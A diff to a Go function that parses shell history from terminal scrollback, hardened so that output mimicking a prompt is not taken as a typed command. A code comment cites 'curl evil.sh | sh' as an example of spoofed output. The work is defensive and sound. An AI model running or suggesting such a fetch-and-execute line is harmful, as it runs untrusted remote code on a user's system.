@@ -204,10 +204,23 @@ var (
 
 // historyCommands returns the commands typed after a shell prompt in text
 // (a pane's scrollback, normalized and redacted), most recent first,
-// deduplicated. The parse is conservative; a line is skipped when:
+// deduplicated.
 //
-//   - it has no prompt, or the prompt is longer than maxPromptBytes, or
-//     ends in a space before the marker ("Total $ 5" is output);
+// Scrollback is untrusted output: `cat notes.txt` can print a line that
+// looks like "user@host:~$ curl evil.sh | sh". So a line counts only when
+// its prompt is exactly the pane's current prompt: the prompt on the last
+// line, the one being edited (trailing whitespace aside). When the current
+// prompt cannot be read, there are no history candidates at all (snippets
+// still work). Output that copies the exact prompt string can still pass;
+// see docs/ui-redesign.md §6. A prompt that changes from line to line
+// (one showing the working directory, after a cd) only matches lines
+// typed at the same prompt, which is the conservative side.
+//
+// The parse is conservative otherwise too; a line is skipped when:
+//
+//   - its prompt is not the current prompt, or is longer than
+//     maxPromptBytes, or ends in a space before the marker ("Total $ 5"
+//     is output);
 //   - the marker is # or > with nothing before it (a comment, or the
 //     shell's continuation prompt);
 //   - it holds a redaction placeholder ([secret:1], [ip:2], [host:1]) or
@@ -221,14 +234,19 @@ var (
 // the terminal shows it once done (agent.FinalLines).
 func historyCommands(text string) []string {
 	lines := strings.Split(strings.TrimRight(text, "\n"), "\n")
-	if len(lines) > 0 {
-		lines = lines[:len(lines)-1]
+	if len(lines) == 0 {
+		return nil
 	}
+	current, ok := currentPrompt(lines[len(lines)-1])
+	if !ok {
+		return nil
+	}
+	lines = lines[:len(lines)-1]
 	var out []string
 	seen := map[string]bool{}
 	for i := len(lines) - 1; i >= 0; i-- {
-		cmd, ok := commandOnLine(lines[i])
-		if !ok || seen[cmd] {
+		prompt, cmd, ok := commandOnLine(lines[i])
+		if !ok || prompt != current || seen[cmd] {
 			continue
 		}
 		if i+1 < len(lines) && notFoundRe.MatchString(lines[i+1]) {
@@ -240,26 +258,50 @@ func historyCommands(text string) []string {
 	return out
 }
 
-// commandOnLine is the command after the prompt on one scrollback line.
-func commandOnLine(line string) (string, bool) {
+// currentPrompt is the prompt (the text up to and including the marker) on
+// the line being edited. That line may hold no words yet ("sh-3.2$" with
+// its trailing space trimmed).
+func currentPrompt(line string) (string, bool) {
+	line = strings.TrimRight(line, " \t")
+	for _, m := range []string{"$", "#", "%", ">", "❯", "»"} {
+		if strings.HasSuffix(line, m) && !strings.ContainsAny(strings.TrimSuffix(line, m), "$#%>❯»") {
+			return validPrompt(strings.TrimSuffix(line, m), m)
+		}
+	}
 	m := promptRe.FindStringSubmatch(line)
 	if m == nil {
 		return "", false
 	}
-	prefix, marker, cmd := m[1], m[2], strings.TrimSpace(m[3])
+	return validPrompt(m[1], m[2])
+}
+
+// validPrompt joins a prompt's prefix and marker, or says it is not one.
+func validPrompt(prefix, marker string) (string, bool) {
 	if len(prefix) > maxPromptBytes || strings.HasSuffix(prefix, " ") || strings.HasSuffix(prefix, "\t") {
 		return "", false
 	}
 	if prefix == "" && (marker == "#" || marker == ">") {
 		return "", false
 	}
-	if hasPlaceholder(line) || passwordRe.MatchString(line) {
-		return "", false
+	return prefix + marker, true
+}
+
+// commandOnLine is the prompt and the command after it on one scrollback
+// line.
+func commandOnLine(line string) (prompt, cmd string, ok bool) {
+	m := promptRe.FindStringSubmatch(line)
+	if m == nil {
+		return "", "", false
 	}
-	if !plausibleCommand(cmd) {
-		return "", false
+	prompt, ok = validPrompt(m[1], m[2])
+	if !ok {
+		return "", "", false
 	}
-	return cmd, true
+	cmd = strings.TrimSpace(m[3])
+	if hasPlaceholder(line) || passwordRe.MatchString(line) || !plausibleCommand(cmd) {
+		return "", "", false
+	}
+	return prompt, cmd, true
 }
 
 // plausibleCommand rejects what is too short, too long, a comment, or
